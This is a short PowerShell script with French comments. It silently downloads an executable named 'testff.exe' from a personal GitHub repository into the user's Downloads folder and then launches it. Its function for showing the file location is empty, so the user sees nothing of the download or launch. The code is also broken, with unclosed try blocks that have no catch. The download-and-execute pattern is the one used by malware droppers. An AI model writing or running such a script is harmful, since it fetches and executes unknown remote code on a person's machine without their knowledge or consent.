# Définir l'URL du fichier à télécharger
$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

# Obtenir le nom d'utilisateur actuel
$userProfile = [System.Environment]::GetFolderPath("UserProfile")

# Définir le chemin local dans le dossier "Téléchargements"
$localPath = "$userProfile\Downloads\testff.exe"

# Fonction pour afficher l'emplacement du fichier
function Show-FileLocation {
    param (
        [string]$filePath
    )
}

# Afficher le chemin de téléchargement

# Créer le répertoire "Téléchargements" s'il n'existe pas
if (-Not (Test-Path -Path "$userProfile\Downloads")) {
    New-Item -ItemType Directory -Path "$userProfile\Downloads"
}

# Télécharger le fichier avec Invoke-WebRequest
try {
    Invoke-WebRequest -Uri $url -OutFile $localPath
    Show-FileLocation -filePath $localPath
}

# Vérifier si le fichier a été téléchargé avec succès
if (Test-Path $localPath) {

    # Lancer le fichier exécutable
    try {
        Start-Process -FilePath $localPath
}
